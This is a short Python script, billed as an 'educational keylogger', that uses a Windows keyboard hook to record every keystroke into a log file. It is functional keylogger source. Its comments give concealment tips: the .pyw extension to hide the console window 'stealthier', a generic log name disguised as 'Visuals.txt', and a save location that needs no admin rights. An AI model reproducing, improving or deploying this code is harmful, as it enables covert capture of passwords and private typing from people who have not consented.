
# Educational keylogger, complete with gratuitous comments.
# By: Mike Brinkman 

# .pyw file extension allows this script to run without invoking the console window like .py (stealthier).  

import sys
import pyHook
import pythoncom
import logging

file_log = 'C:\Config\Visuals.txt'			# Generic name for log file, preferrably pick a location to save in that doesn't require Admin privileges.  

def OnKeyboardEvent(event):					# Our custom callback function.  
    logging.basicConfig(filename=file_log, level=logging.DEBUG, format='%(message)s') # FileHandler=file_log, root logger level=DEBUG, 
    chr(event.Ascii)
    logging.log(10,chr(event.Ascii))
    return True								# Return True to pass the event to other handlers.  
	
hooks_manager = pyHook.HookManager()		# HookManager registers and manages callbacks for low level mouse and keyboard events.
hooks_manager.KeyDown = OnKeyboardEvent 	# On KeyDown event, call OnKeyboardEvent.  Each event can be directed to only one callback function.  
hooks_manager.HookKeyboard()				# Set the hook (begins watching for keyboard events)


# Any application that wishes to receive notifications of global input events 
# (messages, mouse actions, keystrokes) must have a Windows message pump.  
# (Part of Win32 extensions)
pythoncom.PumpMessages()					
